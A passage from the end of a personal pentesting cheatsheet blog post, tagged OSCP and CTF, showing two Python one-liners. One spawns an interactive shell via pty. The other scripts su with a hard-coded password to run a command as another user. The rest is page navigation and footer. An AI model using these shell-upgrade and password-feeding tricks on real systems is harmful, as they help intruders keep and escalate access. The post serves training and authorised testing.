</pre><td class="rouge-code"><pre><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">‘</span><span class="kn">import</span> <span class="n">pty</span><span class="p">;</span> <span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="err">“</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">”</span><span class="p">)</span><span class="err">’</span>
<span class="c1"># execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk
</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen([</span><span class="sh">"</span><span class="s">/bin/su</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">-c</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">bynarr</span><span class="sh">"</span><span class="s">],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,</span><span class="sh">"</span><span class="s">fruity</span><span class="se">\n</span><span class="sh">"</span><span class="s">);time.sleep(0.1);print os.read(master,1024);</span><span class="sh">'</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/categories/pentesting/'>Pentesting</a>, <a href='/blog/categories/cheatsheet/'>Cheatsheet</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/tags/pentest/" class="post-tag no-text-decoration" >Pentest</a> <a href="/blog/tags/oscp/" class="post-tag no-text-decoration" >OSCP</a> <a href="/blog/tags/ctf/" class="post-tag no-text-decoration" >CTF</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Pentesting Cheatsheets - 0LiVEr&url=/blog/posts/Pentesting-Cheatsheets/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Pentesting Cheatsheets - 0LiVEr&u=/blog/posts/Pentesting-Cheatsheets/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Pentesting Cheatsheets - 0LiVEr&url=/blog/posts/Pentesting-Cheatsheets/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/blog/posts/Malware-Analysis/">Malware Analysis of Xworm</a><li><a href="/blog/posts/Overly-Permisive-IAM-resources/">Overly Permisive IAM resources</a><li><a href="/blog/posts/Stack-Based-Buffer-Overflow/">Stack-Based Buffer Overflow Linux x86</a><li><a href="/blog/posts/Duck-CTF/">DUCTF 2021</a><li><a href="/blog/posts/Pentesting-Cheatsheets/">Pentesting Cheatsheets</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/tags/aws/">AWS</a> <a class="post-tag" href="/blog/tags/ctf/">CTF</a> <a class="post-tag" href="/blog/tags/iam/">IAM</a> <a class="post-tag" href="/blog/tags/net/">.Net</a> <a class="post-tag" href="/blog/tags/analysis/">Analysis</a> <a class="post-tag" href="/blog/tags/bof/">BOF</a> <a class="post-tag" href="/blog/tags/cloud/">cloud</a> <a class="post-tag" href="/blog/tags/exploitdev/">ExploitDev</a> <a class="post-tag" href="/blog/tags/htb/">HTB</a> <a class="post-tag" href="/blog/tags/malware/">Malware</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/posts/Duck-CTF/"><div class="card-body"> <span class="timeago small" >Aug 28, 2021<i class="unloaded">2021-08-28T00:34:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DUCTF 2021</h3><div class="text-muted small"><p></p></div></div></a></div><div class="card"> <a href="/blog/posts/Malware-Analysis/"><div class="card-body"> <span class="timeago small" >Mar 31<i class="unloaded">2024-03-31T14:10:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Malware Analysis of Xworm</h3><div class="text-muted small"><p> Xworm Xworm represents a form of malware, targeting Windows systems. Upon infection, it can compromise the security of the system, potentially leading to data theft or unauthorized remote access....</p></div></div></a></div><div class="card"> <a href="/blog/posts/Overly-Permisive-IAM-resources/"><div class="card-body"> <span class="timeago small" >Aug 8, 2021<i class="unloaded">2021-08-08T14:10:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Overly Permisive IAM resources</h3><div class="text-muted small"><p> What are IAM Resources? The user, group, role, policy, and identity provider objects that are stored in IAM. As with other AWS services, you can add, edit, and remove resources from IAM. Done.</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/blog/posts/Boot-to-Root/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/sachinoliver91">Sachin Oliver</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/tags/aws/">AWS</a> <a class="post-tag" href="/blog/tags/ctf/">CTF</a> <a class="post-tag" href="/blog/tags/iam/">IAM</a> <a class="post-tag" href="/blog/tags/net/">.Net</a> <a class="post-tag" href="/blog/tags/analysis/">Analysis</a> <a class="post-tag" href="/blog/tags/bof/">BOF</a> <a class="post-tag" href="/blog/tags/cloud/">cloud</a> <a class="post-tag" href="/blog/tags/exploitdev/">ExploitDev</a> <a class="post-tag" href="/blog/tags/htb/">HTB</a> <a class="post-tag" href="/blog/tags/malware/">Malware</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
